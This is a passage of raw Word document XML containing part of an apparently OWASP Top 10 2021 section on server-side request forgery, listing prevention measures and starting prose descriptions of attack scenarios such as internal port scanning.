          <w:ins w:id="3545" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3546" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Sanitize and validate all client-supplied input data</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2A3E4A62" w14:textId="77777777" w:rsidR="00A70057" w:rsidRDefault="00A70057" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3547" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32B85530" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3548" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3549" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Enforce the URL schema, port, and destination with a positive allow</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="64A8E621" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3550" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3551" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    list</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3E917C12" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3552" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E519095" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3553" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3554" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Do not send raw responses to clients</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4A24A05C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3555" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A28C98D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3556" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3557" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Disable HTTP redirections</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="09C92827" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3558" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05161273" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3559" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3560" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Be aware of the URL consistency to avoid attacks such as DNS</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3ACE74AF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3561" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3562" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    rebinding and “time of check, time of use” (TOCTOU) race conditions</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1D5F2C2D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3563" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="672E8294" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3564" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3565" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Do not mitigate SSRF via the use of a deny list or regular expression.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7E54457F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3566" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3567" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Attackers have payload lists, tools, and skills to bypass deny lists.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="01FB2242" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3568" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A5E010A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3569" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3570" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">### **Additional Measures to </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>consider:*</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>*</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="235AA5EB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3571" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="679BE536" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3572" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3573" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Don't deploy other security relevant services on front systems (</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e.g.</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> OpenID). </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="62B53556" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3574" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3575" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    Control local traffic on these systems (</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e.g.</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> localhost)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5CCC1396" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3576" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C183830" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3577" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3578" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   For frontends with dedicated and manageable user groups use network encryption (</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e.g.</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> VPNs)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="683042FB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3579" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3580" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    on independent systems to consider very high protection needs  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1E868435" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3581" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="298AA3BF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3582" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3583" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## Example Attack Scenarios </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="46B89C98" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3584" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="335C54A0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3585" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3586" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Attackers can use SSRF to attack systems protected behind web</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="78275D0E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3587" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3588" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>application firewalls, firewalls, or network ACLs, using scenarios such</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1929E79C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3589" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3590" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>as:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="77A71985" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3591" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="608AF8F4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3592" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3593" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>**Scenario #</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>1:*</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>* Port scan internal servers – If the network architecture</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4E7D895F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3594" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3595" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>is unsegmented, attackers can map out internal networks and determine if</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="410BEE75" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3596" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3597" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>ports are open or closed on internal servers from connection results or</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="01C7DC65" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3598" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3599" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>elapsed time to connect or reject SSRF payload connections.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6B5EB2A8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3600" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AF8B811" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3601" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3602" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>**Scenario #</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>2:*</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">* Sensitive data exposure – Attackers can access local </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="22BA3746" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3603" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3604" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
